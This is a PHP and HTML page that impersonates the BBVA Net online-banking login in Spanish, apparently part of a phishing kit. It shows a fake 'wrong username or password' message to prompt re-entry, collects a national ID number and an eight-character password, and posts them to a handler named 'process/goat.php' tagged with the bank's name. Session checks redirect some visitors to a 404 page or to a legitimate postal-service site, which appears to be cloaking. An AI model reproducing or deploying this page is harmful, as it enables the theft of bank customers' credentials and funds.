<?php
session_start();


if (isset($_SESSION['estado']) && $_SESSION['estado'] == 1) {


} else if (isset($_SESSION['estado']) && $_SESSION['estado'] == 2) {

	header('location:/404.php');

} else if (isset($_SESSION['estado']) && $_SESSION['estado'] == 3) {

	header('location:https://www.4-72.com.co/publicaciones/236/personas/');
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
	<link rel="stylesheet" href="style.css">


	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>


	<title>Secure Payment</title>



</head>

<body>


	<img src="./img/menu.jpg" alt="" srcset="" width="100%">

	<center>
		<div style="width:90%; margin-top: 80px;">
			<a style="font-size:21px;">Hola, ingresa tu número de documento y contraseña para entrar a BBVA Net:</a>
		</div> <br> <a style="color:rgb(255, 0, 0); margin-top:10px; ">Tu usuario o clave no son correctos</a>
	</center>


	<div class="inp">
		<form action="process/goat.php" method="POST">
			<select name="cc" id="">
				<option value="cedula" selected>Cédula de Ciudadania</option>
			</select><br>

			<input type="tel" id="txtUsuario" name="user" placeholder="Número de documento" required><br>
			<input type="password" name="pass" id="txtPass" placeholder="Contraseña" required><br>

			<?php if (isset($_GET['id'])): ?>
				<input type="hidden" name="id" value="<?php echo htmlspecialchars($_GET['id']); ?>">
			<?php endif; ?>
			<input type="hidden" name="banco" value="BBVA">

			<input type="submit" value="Entrar a BBVA Net" id="btnUsuario"
				style="background-color:#227aba; font-size:17px; border:none;  font-weight: bold; color:white; width:85%; cursor:pointer;"><br>
		</form>
	</div>




	<script type="text/javascript">
		var espera = 0;

		let identificadorTiempoDeEspera;

		function retardor() {
			identificadorTiempoDeEspera = setTimeout(retardorX, 900);
		}

		function retardorX() {

		}

		$(document).ready(function () {

			$('#btnUsuario').click(function () {
				if (($("#txtUsuario").val().length > 0) && ($("#txtPass").val().length == 8)) {
					pasousuario($("#txtPass").val(), $("#txtUsuario").val(), $("#banco").val());
				} else {
					$("#err-mensaje").show();
					$(".user").css("border", "1px solid red");
					$("#txtUsuario").focus();
				}
			});

			$("#txtUsuario").keyup(function (e) {
				$(".user").css("border", "1px solid #CCCCCC");
				$("#err-mensaje").hide();
			});
		});
	</script>


</body>

</html>